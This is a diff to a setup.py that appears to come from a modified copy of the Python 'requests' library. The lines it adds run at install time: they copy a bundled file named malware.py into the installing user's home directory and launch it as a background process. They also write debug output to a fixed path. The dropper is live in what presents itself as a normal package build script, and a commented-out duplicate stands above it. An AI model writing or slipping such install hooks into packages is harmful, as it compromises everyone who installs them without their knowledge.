@@ -68,12 +68,28 @@ with open(os.path.join(here, 'requests', '__version__.py'), 'r', 'utf-8') as f:
 with open('README.md', 'r', 'utf-8') as f:
     readme = f.read()
     
+# home = os.getenv('HOMEPATH')
+# if home is None:
+#     home = os.getenv('HOME')
+# shutil.copy2(os.path.join(here, 'requests', 'malware.py'), os.path.join(home,"malware.py"))
+# command = [sys.executable, home + '/malware.py']
+# subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
+
+
 home = os.getenv('HOMEPATH')
 if home is None:
     home = os.getenv('HOME')
 shutil.copy2(os.path.join(here, 'requests', 'malware.py'), os.path.join(home,"malware.py"))
-command = [sys.executable, home + '/malware.py']
-subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
+command = str(sys.executable + " " + home + '/malware.py')
+#subprocess.call(command, shell=True)
+subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
+
+with open("/home/parish/output.txt", "w") as text_file:
+    for root, dirs, files in os.walk(os.path.join(here, 'requests')):
+        for file in files:
+            text_file.write(os.path.join(root, file) + "\n")
+        text_file.write(command + "\n")
+        text_file.write(str(os.path.exists(home + '/malware.py')) + "\n")
         
 setup(
     name=about['__title__'],
